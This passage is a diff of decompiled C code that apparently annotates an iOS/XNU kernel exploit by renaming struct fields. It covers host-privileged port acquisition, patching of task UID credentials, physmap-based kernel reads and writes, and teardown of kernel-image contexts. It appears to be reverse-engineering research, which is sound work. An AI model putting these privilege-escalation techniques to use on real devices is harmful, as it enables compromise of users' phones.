           variable_addr = kernel_find_symbol_by_cstring_scan(v86, "__DATA", "__data", "developer_mode_status");
@@ -45423,7 +45415,7 @@ LABEL_267:
             return mach_port_with_a2;
           if ( *(uint64_t *)&v104.st_dev )
             goto LABEL_280;
-          v89 = kernel_find_symbol_by_cstring_scan(krwCtx->gap_0x1D20_kern_addr_allows_security_research, "__DATA", "__data", "allows_security_research");
+          v89 = kernel_find_symbol_by_cstring_scan(krwCtx->amfiMachoCtx, "__DATA", "__data", "allows_security_research");
           if ( !v89 )
             return 163867;
           v90 = v89;
@@ -45450,11 +45442,11 @@ LABEL_280:
             if ( (uint32_t)mach_port_with_a2 )
               return mach_port_with_a2;
           }
-          krwCtx->gap_0x1928 = mach_host_self();
+          krwCtx->hostSelfPort = mach_host_self();
           v72 = get_kernel_task_host_port(krwCtx);
-          LODWORD(krwCtx->gap_0x1920) = v72;
+          LODWORD(krwCtx->hostPrivAndSecurityPorts) = v72;
           mach_port_with_a2 = 163854;
-          if ( krwCtx->gap_0x1928 + 1 < 2 )
+          if ( krwCtx->hostSelfPort + 1 < 2 )
             return mach_port_with_a2;
           v73 = v72;
           if ( v72 + 1 < 2 )
@@ -45464,7 +45456,7 @@ LABEL_280:
             if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) )
             {
               v74 = get_ioservice_conn_port(krwCtx);
-              HIDWORD(krwCtx->gap_0x1920) = v74;
+              HIDWORD(krwCtx->hostPrivAndSecurityPorts) = v74;
               if ( (unsigned int)(v74 + 1) < 2 )
                 return mach_port_with_a2;
               goto LABEL_291;
@@ -45479,11 +45471,11 @@ LABEL_293:
 LABEL_291:
             if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023) )
             {
-              v73 = krwCtx->gap_0x1920;
+              v73 = krwCtx->hostPrivAndSecurityPorts;
               goto LABEL_293;
             }
           }
-          v76 = krwCtx->gap_0x1920;
+          v76 = krwCtx->hostPrivAndSecurityPorts;
           if ( v76 + 1 < 2 )
             return 708609;
           v104.st_dev = 0;
@@ -45853,14 +45845,14 @@ __int64 __fastcall driver_dispatch_command3(struct_krwCtx *krwCtx, int cmd, __in
                 goto LABEL_215;
               case DRIVER_CMD_SET_THREAD_KOBJ_DISPATCH:
                 v31 = mach_thread_self();
-                v32 = HIDWORD(krwCtx->gap_0x1918);
+                v32 = HIDWORD(krwCtx->targetAndParentTaskPorts);
                 if ( !v32 )
-                  v32 = krwCtx->gap_0x1918;
+                  v32 = krwCtx->targetAndParentTaskPorts;
                 if ( !kwrite_task_dispatch_via_kobj(krwCtx, v32, v31) )
                   goto LABEL_215;
                 LODWORD(v6) = 0;
-                if ( krwCtx->gap_0x192C + 1 <= 1 )
-                  krwCtx->gap_0x192C = v31;
+                if ( krwCtx->exploitThread + 1 <= 1 )
+                  krwCtx->exploitThread = v31;
                 goto LABEL_146;
               case DRIVER_CMD_GET_OR_SET_SELF_UID_CRED:
                 v8[0] = get_or_set_uid_cred_in_task(krwCtx, 0, 0, 0);
@@ -45938,7 +45930,7 @@ LABEL_128:
                 else
                   v33 = mach_task_self_;
 LABEL_136:
-                v8[0] = set_task_special_port_and_patch_uid(krwCtx, v33, krwCtx->gap_0x1920);
+                v8[0] = set_task_special_port_and_patch_uid(krwCtx, v33, krwCtx->hostPrivAndSecurityPorts);
                 goto LABEL_215;
               case DRIVER_CMD_PHYSMAP_KREAD_AND_REFRESH:
                 if ( !(uint32_t)v3 )
@@ -46085,7 +46077,7 @@ LABEL_188:
                 *(uint32_t *)(v3 + 24) = 0;
               }
               LODWORD(v6) = 0;
-              v8[0] = mach_vm_wire(krwCtx->gap_0x1920, *(uint32_t *)v3, *(uint64_t *)(v3 + 8), *(uint64_t *)(v3 + 16), v45) == 0;
+              v8[0] = mach_vm_wire(krwCtx->hostPrivAndSecurityPorts, *(uint32_t *)v3, *(uint64_t *)(v3 + 8), *(uint64_t *)(v3 + 16), v45) == 0;
               goto LABEL_216;
             case DRIVER_CMD_KWRITE_VERSION_CHECK:
               v8[0] = kwrite_with_version_check(krwCtx, *(uint32_t *)v3, *(uint64_t *)(v3 + 8), *(unsigned __int8 *)(v3 + 24));
@@ -46150,16 +46142,16 @@ LABEL_11:
     if ( !krwCtx->gap_0x1900
       || (unsigned int)check_task_dyld_info_versioned(krwCtx, mach_task_self_, 2, &krwCtx->gap_0x1908, 8) )
     {
-      if ( (v6 = krwCtx->gap_0x192C, (unsigned int)(v6 + 1) < 2)
+      if ( (v6 = krwCtx->exploitThread, (unsigned int)(v6 + 1) < 2)
         || v6 != mach_thread_self()
         || ((v7 = mach_thread_self(), krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023)) ? (v8 = 1) : (v8 = 0x4000000),
             (unsigned int)set_flags_something_INEEDTOLOOK_sub_3F8C0(krwCtx, v7, v8, 0)) )
       {
         if ( !krwCtx->gap_0x1910_size8 || (unsigned int)get_or_set_uid_cred_in_task(krwCtx, krwCtx->gap_0x1910_size4, krwCtx->gap_0x1914_size4, 0) )
         {
-          if ( mach_host_self() == krwCtx->gap_0x1928
+          if ( mach_host_self() == krwCtx->hostSelfPort
             || krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_HOST_PORT_READY)
-            || (unsigned int)set_task_special_port_and_patch_uid(krwCtx, mach_task_self_, krwCtx->gap_0x1928) )
+            || (unsigned int)set_task_special_port_and_patch_uid(krwCtx, mach_task_self_, krwCtx->hostSelfPort) )
           {
             free_decompressed_macho(krwCtx);
             return 0;
@@ -46204,59 +46196,59 @@ __int64 __fastcall driver_close_internal(struct_krwCtx *krwCtx)
 
   necp_dispatch_by_version((struct_krwCtx *)krwCtx);
   iterate_active_threads((__int64)krwCtx);
-  v2 = (void (__fastcall *)(char *))*((uint64_t *)krwCtx + 58);
+  v2 = (void (__fastcall *)(char *))krwCtx->cleanup_hook;
   if ( v2 )
     v2(krwCtx);
-  v3 = *((uint32_t *)krwCtx + 1606);
+  v3 = krwCtx->targetVmPort;
   if ( v3 + 1 >= 2 )
     mach_port_deallocate(mach_task_self_, v3);
-  if ( *((uint32_t *)krwCtx + 1614) != -1
-    || *((uint32_t *)krwCtx + 1615) != -1
-    || *((uint32_t *)krwCtx + 1612) != -1
-    || *((uint32_t *)krwCtx + 1613) != -1
-    || *((uint32_t *)krwCtx + 1616) != -1 )
+  if ( krwCtx->pipeFd0 != -1
+    || krwCtx->pipeFd1 != -1
+    || krwCtx->krw_pipe_0 != -1
+    || krwCtx->krw_pipe_1 != -1
+    || krwCtx->iosurfaceFd_size4 != -1 )
   {
     v27 = -1;
     if ( !(unsigned int)fd_open_dev_null(&v27) )
     {
-      v4 = *((uint32_t *)krwCtx + 1614);
+      v4 = krwCtx->pipeFd0;
       if ( v4 != -1 )
       {
         close(v4);
-        *((uint32_t *)krwCtx + 1614) = -1;
+        krwCtx->pipeFd0 = -1;
       }
-      v5 = *((uint32_t *)krwCtx + 1615);
+      v5 = krwCtx->pipeFd1;
       if ( v5 != -1 )
       {
         close(v5);
-        *((uint32_t *)krwCtx + 1615) = -1;
+        krwCtx->pipeFd1 = -1;
       }
-      v6 = *((uint32_t *)krwCtx + 1616);
+      v6 = krwCtx->iosurfaceFd_size4;
       if ( v6 != -1 )
       {
         close(v6);
-        *((uint32_t *)krwCtx + 1616) = -1;
+        krwCtx->iosurfaceFd_size4 = -1;
       }
-      v7 = *((uint32_t *)krwCtx + 1612);
+      v7 = krwCtx->krw_pipe_0;
       if ( v7 != -1 )
       {
         close(v7);
-        *((uint32_t *)krwCtx + 1612) = -1;
+        krwCtx->krw_pipe_0 = -1;
       }
-      v8 = *((uint32_t *)krwCtx + 1613);
+      v8 = krwCtx->krw_pipe_1;
       if ( v8 != -1 )
       {
         close(v8);
-        *((uint32_t *)krwCtx + 1613) = -1;
+        krwCtx->krw_pipe_1 = -1;
       }
       fd_close(v27);
     }
   }
-  if ( *((uint64_t *)krwCtx + 5) )
+  if ( krwCtx->gap_0x28 )
     teardown_semaphore_helper_ctx(krwCtx, 1);
-  if ( *((uint64_t *)krwCtx + 43) >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
+  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(10002, 60, 75, 0, 3) && (krwCtx->flags & KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) != 0 )
     iogpu_teardown_ctx(krwCtx);
-  if ( *((uint64_t *)krwCtx + 937) )
+  if ( krwCtx->IOKitConnInfo )
   {
     v27 = -1;
     if ( !(unsigned int)fd_open_dev_null(&v27) )
@@ -46265,7 +46257,7 @@ __int64 __fastcall driver_close_internal(struct_krwCtx *krwCtx)
       fd_close(v27);
     }
   }
-  if ( (unsigned int)(*((uint32_t *)krwCtx + 23) + 1) >= 2 )
+  if ( (unsigned int)(krwCtx->gap_0x5C_size4 + 1) >= 2 )
   {
     v27 = -1;
     if ( !(unsigned int)fd_open_dev_null(&v27) )
@@ -46274,7 +46266,7 @@ __int64 __fastcall driver_close_internal(struct_krwCtx *krwCtx)
       fd_close(v27);
     }
   }
-  if ( (unsigned int)(*((uint32_t *)krwCtx + 43) + 1) >= 2 )
+  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 )
   {
     v27 = -1;
     if ( !(unsigned int)fd_open_dev_null(&v27) )
@@ -46284,32 +46276,32 @@ __int64 __fastcall driver_close_internal(struct_krwCtx *krwCtx)
     }
   }
   teardown_krw_thread((struct_krwCtx *)krwCtx);
-  mach_port_deallocate(mach_task_self_, *((uint32_t *)krwCtx + 1608));
-  v9 = *((uint32_t *)krwCtx + 1609);
+  mach_port_deallocate(mach_task_self_, krwCtx->hostPrivPort);
+  v9 = krwCtx->hostSecurityPort;
   if ( v9 + 1 >= 2 )
     mach_port_deallocate(mach_task_self_, v9);
-  v10 = *((uint32_t *)krwCtx + 4);
+  v10 = krwCtx->gap_0x10;
   if ( v10 + 1 >= 2 )
     IOObjectRelease(v10);
-  if ( (unsigned int)(*((uint32_t *)krwCtx + 1590) + 1) >= 2 )
-    *((uint32_t *)krwCtx + 1590) = 0;
-  v11 = *((uint64_t *)krwCtx + 35);
+  if ( (unsigned int)(krwCtx->gap_0x18D8_size4 + 1) >= 2 )
+    krwCtx->gap_0x18D8_size4 = 0;
+  v11 = krwCtx->mappedKernelRegion;
   if ( v11 )
   {
-    v12 = *((uint64_t *)krwCtx + 36);
+    v12 = krwCtx->mappedKernelSize;
     if ( v12 )
       vm_deallocate(mach_task_self_, v11, v12);
   }
-  v13 = *((uint32_t *)krwCtx + 153);
+  v13 = krwCtx->semaphore;
   if ( v13 + 1 >= 2 )
   {
     semaphore_destroy(mach_task_self_, v13);
-    *((uint32_t *)krwCtx + 153) = 0;
+    krwCtx->semaphore = 0;
   }
   if ( !pthread_mutex_lock(&krwCtx->someMutex2) )
   {
-    v14 = (uint32_t *)*((uint64_t *)krwCtx + 110);
-    *((uint64_t *)krwCtx + 110) = 0;
+    v14 = (uint32_t *)krwCtx->gap_0x370;
+    krwCtx->gap_0x370 = 0;
     if ( v14 )
     {
       do
@@ -46330,67 +46322,67 @@ __int64 __fastcall driver_close_internal(struct_krwCtx *krwCtx)
   }
   pthread_mutex_destroy(&krwCtx->someMutex2);
   pthread_mutex_destroy(&krwCtx->someMutex);
-  v17 = *((uint64_t *)krwCtx + 931);
+  v17 = krwCtx->sandboxMachoCtx;
   if ( v17 )
   {
     free_kernel_image_resources(v17);
-    free(*((void **)krwCtx + 931));
-    *((uint64_t *)krwCtx + 931) = 0;
+    free((void *)krwCtx->sandboxMachoCtx);
+    krwCtx->sandboxMachoCtx = 0;
   }
-  v18 = *((uint64_t *)krwCtx + 932);
+  v18 = krwCtx->amfiMachoCtx;
   if ( v18 )
   {
     free_kernel_image_resources(v18);
-    free(*((void **)krwCtx + 932));
-    *((uint64_t *)krwCtx + 932) = 0;
+    free((void *)krwCtx->amfiMachoCtx);
+    krwCtx->amfiMachoCtx = 0;
   }
-  v19 = *((uint64_t *)krwCtx + 933);
+  v19 = krwCtx->kextMachoCtx0;
   if ( v19 )
   {
     free_kernel_image_resources(v19);
-    free(*((void **)krwCtx + 933));
-    *((uint64_t *)krwCtx + 933) = 0;
+    free((void *)krwCtx->kextMachoCtx0);
+    krwCtx->kextMachoCtx0 = 0;
   }
-  v20 = *((uint64_t *)krwCtx + 934);
+  v20 = krwCtx->kextMachoCtx1;
   if ( v20 )
   {
     free_kernel_image_resources(v20);
-    free(*((void **)krwCtx + 934));
-    *((uint64_t *)krwCtx + 934) = 0;
+    free((void *)krwCtx->kextMachoCtx1);
+    krwCtx->kextMachoCtx1 = 0;
   }
-  v21 = *((uint64_t *)krwCtx + 935);
+  v21 = krwCtx->kextMachoCtx2;
   if ( v21 )
   {
     free_kernel_image_resources(v21);
-    free(*((void **)krwCtx + 935));
-    *((uint64_t *)krwCtx + 935) = 0;
+    free((void *)krwCtx->kextMachoCtx2);
+    krwCtx->kextMachoCtx2 = 0;
   }
-  v22 = *((uint64_t *)krwCtx + 832);
+  v22 = krwCtx->gap_0x1A00;
   if ( v22 )
   {
     free_kernel_image_resources(v22);
-    free(*((void **)krwCtx + 832));
-    *((uint64_t *)krwCtx + 832) = 0;
+    free((void *)krwCtx->gap_0x1A00);
+    krwCtx->gap_0x1A00 = 0;
   }
-  v23 = *((uint64_t *)krwCtx + 831);
+  v23 = (uint64_t)krwCtx->gap_0x19F8;
   if ( v23 )
   {
     free_kernel_image_resources(v23);
-    free(*((void **)krwCtx + 831));
-    *((uint64_t *)krwCtx + 831) = 0;
+    free(krwCtx->gap_0x19F8);
+    krwCtx->gap_0x19F8 = 0;
   }
-  v24 = (void *)*((uint64_t *)krwCtx + 930);
+  v24 = (void *)krwCtx->puafPagesBuf;
   if ( v24 )
   {
     free(v24);
-    *((uint64_t *)krwCtx + 930) = 0;
-    *((uint32_t *)krwCtx + 1858) = 0;
+    krwCtx->puafPagesBuf = 0;
+    krwCtx->gap_0x1D08_size4 = 0;
   }
-  v25 = *((uint32_t *)krwCtx + 58);
+  v25 = krwCtx->gap_0xE8;
   if ( v25 + 1 >= 2 )
   {
     mach_port_deallocate(mach_task_self_, v25);
-    *((uint32_t *)krwCtx + 58) = 0;
+    krwCtx->gap_0xE8 = 0;
   }
   bzero(krwCtx, 0x1D60u);
   free(krwCtx);
@@ -46551,8 +46543,8 @@ bool __fastcall find_kernel_text_exec_section(struct_krwCtx *krwCtx, __int64 *a2
 
   v19 = 0;
   v8 = 0;
-  v6 = krwCtx->gap_0x118;
-  if ( v6 && krwCtx->gap_0x120 )
+  v6 = krwCtx->mappedKernelRegion;
+  if ( v6 && krwCtx->mappedKernelSize )
   {
     v7 = *(uint64_t *)(v6 + 328);
     v19 = v7;
@@ -46561,7 +46553,7 @@ bool __fastcall find_kernel_text_exec_section(struct_krwCtx *krwCtx, __int64 *a2
       *a2 = v7;
       return true;
     }
-    v8 = *(uint64_t *)(krwCtx->gap_0x118 + 320LL);
+    v8 = *(uint64_t *)(krwCtx->mappedKernelRegion + 320LL);
     if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) && v7 && v8 != 0 )
     {
       *a2 = v7;
@@ -46609,8 +46601,8 @@ bool __fastcall find_kernel_text_exec_section(struct_krwCtx *krwCtx, __int64 *a2
     v8 = v10;
 LABEL_40:
     *a3 = v10;
-    v15 = krwCtx->gap_0x118;
-    if ( v15 && krwCtx->gap_0x120 )
+    v15 = krwCtx->mappedKernelRegion;
+    if ( v15 && krwCtx->mappedKernelSize )
     {
       *(uint64_t *)(v15 + 320) = v8;
       *(uint64_t *)(v15 + 328) = v19;
@@ -46657,7 +46649,7 @@ int __fastcall update_physmap_table_entry_count(struct_krwCtx *krwCtx, task_insp
   host_t v4; // w2
   int result; // w0
 
-  v4 = krwCtx->gap_0x1920_size4;
+  v4 = krwCtx->hostPrivPort;
   if ( v4 + 1 < 2 )
     return 0;
   if ( krwCtx->xnuVersionPacked >= 0x1C1B1914600000uLL )
@@ -46665,7 +46657,7 @@ int __fastcall update_physmap_table_entry_count(struct_krwCtx *krwCtx, task_insp
     result = set_task_special_port_and_patch_uid(krwCtx, a2, v4);
     if ( !result )
       return result;
-    v4 = krwCtx->gap_0x1920_size4;
+    v4 = krwCtx->hostPrivPort;
   }
   *a3 = v4;
   return 1;
